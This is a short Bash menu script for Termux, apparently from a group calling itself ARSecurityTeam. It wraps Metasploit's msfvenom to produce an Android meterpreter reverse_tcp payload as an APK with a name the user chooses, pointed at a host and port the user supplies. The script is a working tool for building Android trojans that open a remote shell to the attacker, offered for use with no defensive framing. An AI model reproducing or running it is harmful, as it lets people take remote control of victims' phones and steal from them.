#!/bin/bash
#this tools only for termux
#ARSecurityTeam
red='\033[1;31m'
blue='\033[1;34m'
white='\033[1;37m'
green='\033[1;32m'
yellow='\033[1;33m'
c='\033[1;36m'
clear
banner (){
echo -e ""
echo -e "\033[1;31m       ___  ___     _                           "
echo -e "\033[1;31m       |  \/  |    | |                          "
echo -e "\033[1;31m       | .  . | ___| |_ __ _   \033[1;34m __ _  ___ _ __  "
echo -e "\033[1;31m       | |\/| |/ _ \ __/ _  |  \033[1;34m/ _  |/ _ \ '_ \ "
echo -e "\033[1;31m       | |  | |  __/ || (_| | \033[1;34m| (_| |  __/ | | |"
echo -e "\033[1;31m       \_|  |_/\___|\__\__,_|  \033[1;34m\__, |\___|_| |_|"
echo -e "                                \033[1;34m__/ |           "
echo -e "      Devlop by ARSecurityTeam |___/"
echo -e "\033[1;31m      Metasploit \033[1;34mpayload Genarate tools"
echo -e ""
echo -e ""
}
banner
printf "$white"
echo "  [1] Create android payload. "
echo ""
echo "  [2] Lunch msfconsole"
echo ""
echo "  [0] Exit. "
echo ""
read -p "  [+] Enter your choice: " mf
if [ $mf = "1" ]
then
clear
banner
read -p "  [+] What is your lhost: " ablhost
echo ""
read -p "  [+] What is your lport: " ablport
echo ""
read -p "  [+] Enter payload app name (without .apk): " abapp
echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ablhost LPORT=$ablport R > $abapp.apk
echo " Your payload genarate succesfull"
elif [ $mf = "2" ]
then
clear
banner
echo -e "  \033[1;32m[\033[1;31m+\033[1;32m]\033[1;37m launching metasploit... "
elif [ $mf = "0" ]
then
clear
banner
exit
fi